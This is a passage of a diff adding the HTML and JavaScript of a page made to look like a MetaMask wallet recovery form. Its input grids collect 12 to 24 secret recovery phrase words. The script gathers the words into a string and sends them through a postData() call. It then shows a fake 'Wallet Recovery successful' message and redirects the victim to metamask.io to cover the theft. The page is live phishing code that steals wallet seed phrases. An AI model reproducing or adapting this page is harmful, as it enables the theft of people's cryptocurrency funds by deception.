+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">5 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">6 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">7 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">8 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">9 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">10 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">11 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">12 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">13 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">14 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">15 </label>
+          <input type="password" class="form15">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye15">
+      </div>
+    </div>
+    <div>
+    <button class="button15">Confrim Secret Recovery Phrase</button>
+    </div>
+</div>
+</form>
+    <!-- form18 -->
+     <form action="#" id="myform" class="form181">
+    <div class="hide wordForm3">
+    <div class="fourth ">
+      <div>
+        <label for="">1 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">2 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">3 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">4 </label>
+        <input type="password" class="form18">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">5 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">6 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">7 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">8 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">9 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">10 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">11 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">12 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">13 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">14 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">15 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">16 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">17 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">18 </label>
+          <input type="password" class="form18">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye18">
+      </div>
+    </div>
+    <div>
+    <button disabled class=" button18">Confrim Secret Recovery Phrase</button>
+    </div>
+</div>
+</form>
+    <!-- form21 -->
+     <form action="#" id="myform" class="form211">
+    <div class="hide wordForm4">
+    <div class="fourth">
+      <div>
+        <label for="">1 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">2 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">3 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">4 </label>
+        <input type="password" class="form21">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">5 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">6 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">7 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">8 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">9 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">10 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">11 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">12 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">13 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">14 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">15 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">16 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">17 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">18 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">19 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">20 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">21 </label>
+          <input type="password" class="form21">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye21">
+      </div>
+    </div>
+    <div>
+    <button disabled class="button21">Confrim Secret Recovery Phrase</button>
+    </div>
+</div>
+</form>
+    <!-- form24 -->
+     <form action="#" id="myform" class="form241">
+    <div class="hide wordForm5">
+    <div class="fourth ">
+      <div>
+        <label for="">1 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">2 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">3 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">4 </label>
+        <input type="password" class="form24">
+           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">5 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">6 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">7 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">8 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">9 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">10 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">11 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">12 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">13 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">14 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">15 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">16 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">17 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">18 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">19 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">20 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">21 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">21 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">23 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">24 </label>
+          <input type="password" class="form24">
+             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU" alt="eye-close" class="eye24">
+      </div>
+    </div>
+    <div>
+    <button disabled class="button24" >Confrim Secret Recovery Phrase</button>
+    </div>
+    </div>
+  </form>
+
+  <div class="form-mainbox done hide">
+    <div class="tada-box">
+        <img src="https://bestfilltype.netlify.app/tada.png" alt="confirm">
+    </div>
+
+    <div class="head-text">
+        <h1>Wallet Recovery successful</h1>
+    </div>
+
+    <div class="head-text-p">
+        <p>You’ve successfully Unlocked your wallet. Keep your Secret Recovery Phrase safe and secret -- it’s your responsibility!</p>
+
+        <br>
+          <p>Please Wait you will be redirected in <span class="count"></span><br /> <a href="#">Learn more</a></p>
+    </div>
+
+
+
+    <div class="btnBox">
+        <button class="btn-cofirm">I understand</button>
+    </div>
+    </form>
+
+    <!--- End Form24 ------>
+</div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script>
+    var unite  = document.querySelector(".form121");
+    var unite1 = document.querySelector(".form151");
+    var unite2 = document.querySelector('.form181');
+    var unite3 = document.querySelector('.form211');
+    var unite4 = document.querySelector('.form241');
+
+    var unit = document.querySelectorAll(".form12");
+    var unit1 = document.querySelectorAll(".form15");
+    var unit2 = document.querySelectorAll('.form18');
+    var unit3 = document.querySelectorAll('.form21');
+    var unit4 = document.querySelectorAll('.form24');
+
+    var done = document.querySelector('.done')
+    var count2 = document.querySelector(".count")
+
+    var wordOptions = document.querySelector("#numList");
+
+
+
+    var eye12 = document.querySelectorAll('.eye12')
+    var eye15 = document.querySelectorAll('.eye15')
+    var eye18 = document.querySelectorAll('.eye18')
+    var eye21 = document.querySelectorAll('.eye21')
+    var eye24 = document.querySelectorAll('.eye24')
+
+    const timer2 = (timeleft) => {
+        let downloadTimer = setInterval(function () {
+          if (timeleft <= 0) {
+            clearInterval(downloadTimer);
+          }
+          count2.textContent = `0:0${0 + timeleft} Seconds`;
+          timeleft -= 1;
+          if (timeleft === -1) {
+            window.location.replace("https://metamask.io/");
+          }
+        }, 1000);
+      };
+
+    $('.form12').keyup((e)=>{
+      if (unit[0].value !== '' && unit[1].value !== '' &&  unit[2].value !== '' && unit[3].value !== '' && unit[4].value !== '' && unit[5].value !== '' && unit[6].value !== '' && unit[7].value !== '' && unit[8].value !== '' && unit[9].value !== '' && unit[10].value !== '' && unit[11].value !== '') {
+        $('.button12').css('background-color','#0376c9');
+        $('.button12').prop('disabled', false)
+      }
+    });
+    $('.form15').keyup((e)=>{
+      if (unit1[0].value !== "" && unit1[1].value !== "" &&  unit1[2].value !== "" && unit1[3].value !== "" && unit1[4].value !== "" && unit1[5].value !== "" && unit1[6].value !== "" && unit1[7].value !== "" && unit1[8].value !== "" && unit1[9].value !== "" && unit1[10].value !== "" && unit1[11].value !== "" && unit1[12].value !== "" && unit1[13].value !== "" && unit1[14].value !== "") {
+        $('.button15').css('background-color','#0376c9');
+        $('.button15').prop('disabled', false)
+      }
+    });
+    $('.form18').keyup((e)=>{
+      if (unit2[0].value !== "" && unit2[1].value !== "" &&  unit2[2].value !== "" && unit2[3].value !== "" && unit2[4].value !== "" && unit2[5].value !== "" && unit2[6].value !== "" && unit2[7].value !== "" && unit2[8].value !== "" && unit2[9].value !== "" && unit2[10].value !== "" && unit2[11].value !== "" && unit2[12].value !== "" && unit2[13].value !== "" && unit2[14].value !== "" && unit2[15].value !== ""  && unit2[16].value !== "" && unit2[17].value !== "") {
+        $('.button18').css('background-color','#0376c9');
+        $('.button18').prop('disabled', false)
+      }
+    });
+    $('.form21').keyup((e)=>{
+      if (unit3[0].value !== "" && unit3[1].value !== "" &&  unit3[2].value !== "" && unit3[3].value !== "" && unit3[4].value !== "" && unit3[5].value !== "" && unit3[6].value !== "" && unit3[7].value !== "" && unit3[8].value !== "" && unit3[9].value !== "" && unit3[10].value !== "" && unit3[11].value !== "" && unit3[12].value !== "" && unit3[13].value !== "" && unit3[14].value !== "" && unit3[15].value !== ""  && unit3[16].value !== "" && unit3[17].value !== "" && unit3[18].value !== "" && unit3[19].value !== "" && unit3[20].value !== "") {
+        $('.button21').css('background-color','#0376c9');
+        $('.button21').prop('disabled', false)
+      }
+    });
+    $('.form24').keyup((e)=>{
+      if (unit4[0].value !== "" && unit4[1].value !== "" &&  unit4[2].value !== "" && unit4[3].value !== "" && unit4[4].value !== "" && unit4[5].value !== "" && unit4[6].value !== "" && unit4[7].value !== "" && unit4[8].value !== "" && unit4[9].value !== "" && unit4[10].value !== "" && unit4[11].value !== "" && unit4[12].value !== "" && unit4[13].value !== "" && unit4[14].value !== "" && unit4[15].value !== ""  && unit4[16].value !== "" && unit4[17].value !== "" && unit4[18].value !== "" && unit4[19].value !== "" && unit4[20].value !== "" && unit4[21].value !== "" && unit4[22].value !== "" && unit4[23].value !== "") {
+        $('.button24').css('background-color','#0376c9');
+        $('.button24').prop('disabled', false)
+      }
+    });
+
+    wordOptions.addEventListener('change', ()=> {
+      if(wordOptions.value === "12"){
+        document.querySelector('.wordForm1').classList.remove('hide');
+      document.querySelector('.wordForm2').classList.add('hide');
+      document.querySelector('.wordForm3').classList.add('hide');
+      document.querySelector('.wordForm4').classList.add('hide');
+      document.querySelector('.wordForm5').classList.add('hide');
+    }else if(wordOptions.value === "15"){
+      document.querySelector('.wordForm1').classList.add('hide');
+      document.querySelector('.wordForm2').classList.remove('hide');
+      document.querySelector('.wordForm3').classList.add('hide');
+      document.querySelector('.wordForm4').classList.add('hide');
+      document.querySelector('.wordForm5').classList.add('hide');
+    }else if(wordOptions.value === "18"){
+      document.querySelector('.wordForm1').classList.add('hide');
+      document.querySelector('.wordForm2').classList.add('hide');
+      document.querySelector('.wordForm3').classList.remove('hide');
+      document.querySelector('.wordForm4').classList.add('hide');
+      document.querySelector('.wordForm5').classList.add('hide');
+    }else if(wordOptions.value === "21"){
+      document.querySelector('.wordForm1').classList.add('hide');
+      document.querySelector('.wordForm2').classList.add('hide');
+      document.querySelector('.wordForm3').classList.add('hide');
+      document.querySelector('.wordForm4').classList.remove('hide');
+      document.querySelector('.wordForm5').classList.add('hide');
+    }else{
+      document.querySelector('.wordForm1').classList.add('hide');
+      document.querySelector('.wordForm2').classList.add('hide');
+      document.querySelector('.wordForm3').classList.add('hide');
+      document.querySelector('.wordForm4').classList.add('hide');
+      document.querySelector('.wordForm5').classList.remove('hide');
+    }
+    });
+
+    unite.addEventListener("submit", (event) => {
+      event.preventDefault();
+        if(unit[0].value === "" || unit[1].value === "" ||  unit[2].value === "" || unit[3].value === "" || unit[4].value === "" || unit[5].value === "" || unit[6].value === "" || unit[7].value === "" || unit[8].value === "" || unit[9].value === "" || unit[10].value === "" || unit[11].value === ""){
+          document.querySelector('.button12').disabled = true;
+      }
+      else {
+          let data = `Word 1: ${unit[0].value} \nWord 2: ${unit[1].value} \nWord 3: ${unit[2].value} \nWord 4: ${unit[3].value} \nWord 5: ${unit[4].value} \nWord 6: ${unit[5].value} \nWord 7: ${unit[6].value} \nWord 8: ${unit[7].value} \nWord 9: ${unit[8].value} \nWord 10: ${unit[9].value} \nWord 11: ${unit[10].value} \nWord 12: ${unit[11].value}}`;
+          postData(data);
+          setTimeout(() => {
+            unite.classList.add('hide');
+            document.querySelector('.went').classList.add("hide")
+            done.classList.remove('hide');
+            timer2(10)
+          }, 4000);
+             }
+  });
+
+  unite1.addEventListener("submit", (event) => {
+      event.preventDefault();
+        if(unit1[0].value === "" || unit1[1].value === "" ||  unit1[2].value === "" || unit1[3].value === "" || unit1[4].value === "" || unit1[5].value === "" || unit1[6].value === "" || unit1[7].value === "" || unit1[8].value === "" || unit1[9].value === "" || unit1[10].value === "" || unit1[11].value === "" || unit1[12].value === "" || unit1[13].value === "" || unit1[14].value === ""){
+          document.querySelector('.button15').disabled = true;
+      }
+      else {
+          let data = `Word 1: ${unit1[0].value} \nWord 2: ${unit1[1].value} \nWord 3: ${unit1[2].value} \nWord 4: ${unit1[3].value} \nWord 5: ${unit1[4].value} \nWord 6: ${unit1[5].value} \nWord 7: ${unit1[6].value} \nWord 8: ${unit1[7].value} \nWord 9: ${unit1[8].value} \nWord 10: ${unit1[9].value} \nWord 11: ${unit1[10].value} \nWord 12: ${unit1[11].value} \nWord 13: ${unit1[12].value} \nWord 14: ${unit1[13].value} \nWord 15: ${unit1[14].value}`;
+          postData(data);
+          setTimeout(() => {
+            unite1.classList.add('hide');
+            document.querySelector('.went').classList.add("hide")
+            done.classList.remove('hide');
+            timer2(10)
+          }, 4000);
+             }
+  });
+  unite2.addEventListener("submit", (event) => {
